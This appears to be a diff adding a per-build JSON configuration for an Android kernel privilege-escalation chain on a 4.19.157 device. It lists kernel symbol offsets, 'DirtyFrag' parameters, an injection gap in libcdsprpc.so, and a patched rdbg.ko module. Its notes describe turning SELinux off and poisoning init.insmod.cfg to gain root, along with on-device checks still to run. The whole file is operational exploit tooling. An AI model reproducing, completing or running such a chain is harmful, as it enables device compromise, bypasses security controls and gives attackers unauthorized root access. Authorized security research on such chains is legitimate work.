@@ -1,0 +1,63 @@
+{
+  "name": "q2_50837850062000150",
+  "description": "build 50837850062000150, kernel 4.19.157+ (MERGED single-carrier)",
+  "status": "READY (split flow) — kernel offsets derived & self-consistent (DirtyFrag live: patch 2024-02-05); merged stub too big for this build's exec gaps, so split_flow is set. Offline-validated; not yet run on hardware.",
+  "split_flow": true,
+  "port_notes": [
+    "selinux_state absent from kallsyms (no data syms, no BTF) -> xref'd via avc_has_perm_noaudit callers = 0xffffff800976f8f8 (dsel 0x109672c). Auto-handled by port.py.",
+    "task_struct->cred = 0x7e0 on 4.19.157 (not 0x7e8 as on 4.19.325) -> derived from commit_creds. enforcing_off=1, cred->security=0x78 unchanged.",
+    "tracking daemon is 'trackingfidelityservice' (user=system, group camera), not 'trackingservice'. Confirm on-device that ctl.restart re-runs it, that its SELinux domain can open vendor_file (rdbg.ko), and that it maps the inject_lib.",
+    "No tracking-mapped, shell-readable lib has a >=~3500B exec zero-gap (old toolchain packs tight): libgralloc.qti=552B, libcdsprpc=3328B; MERGED stub=3500B. Hence split_flow: Phase A injects a small enforcing-only rdbg carrier (104B patch -> 1904B stub, fits libcdsprpc's 3328B gap) to reach Permissive; Phase B loads a renamed FULL cred carrier ('rdbgcp') via a shell-poisoned cfg under DAC -> root. Both patched inits return early (no device registration) so they coexist.",
+    "insmod_sh trigger present in vendor (init.insmod.sh / init-insmod-sh_exec); service name assumed 'insmod_sh' as on newer builds — verify.",
+    "ON-DEVICE TODO: confirm rdbg is NOT auto-loaded at boot (chain needs to load it), trackingfidelityservice restarts on the poisoned dumpsys-input, its domain can open rdbg.ko, and it maps libcdsprpc (else pick another mapped shell-readable lib with >=~2KB gap for inject_lib)."
+  ],
+  "device": {
+    "build_incremental": "50837850062000150",
+    "vermagic": "4.19.157+"
+  },
+  "dirtyfrag": {
+    "sa_spi": "0xdeadbe10",
+    "writer_spi": "0xdeadbe11",
+    "keymat_base": "0x41"
+  },
+  "kernel": {
+    "anchor_symbol": "__platform_driver_register",
+    "enforcing_off": 1,
+    "cred_off": "0x7e0",
+    "cred_security_off": "0x78",
+    "merged": true,
+    "delta_selinux_from_anchor": "0x109672c",
+    "delta_findvpid_from_anchor": "0xffa047cc",
+    "delta_pidtask_from_anchor": "0xffa049c0",
+    "delta_ssuse_from_anchor": "0xffd631ec"
+  },
+  "carrier": {
+    "device_path": "/vendor/lib/modules/rdbg.ko",
+    "local_ko": "q2_50837850062000150/rdbg.ko",
+    "anchor_reloc_off": "0x14"
+  },
+  "inject_lib": {
+    "device_path": "/vendor/lib64/libcdsprpc.so",
+    "init_array_off": "0x3d180",
+    "orig_ctor_off": "0x3b8f8",
+    "stub_gap_off": "0x15300",
+    "stub_gap_size": 3328
+  },
+  "libandroid_servers": {
+    "device_path": "/system/lib64/libandroid_servers.so",
+    "dump_off": "0x84ff0",
+    "dump_size": 992
+  },
+  "cfg": {
+    "device_path": "/vendor/etc/init.insmod.cfg",
+    "local_cfg": "q2_50837850062000150/init.insmod.cfg",
+    "inject_off": "0x21",
+    "inject_len": 54,
+    "shell_poison_under_enforcing": true
+  },
+  "services": {
+    "tracking": "trackingfidelityservice",
+    "insmod_sh": "insmod_sh"
+  },
+  "property_socket": "/dev/socket/property_service"
+}
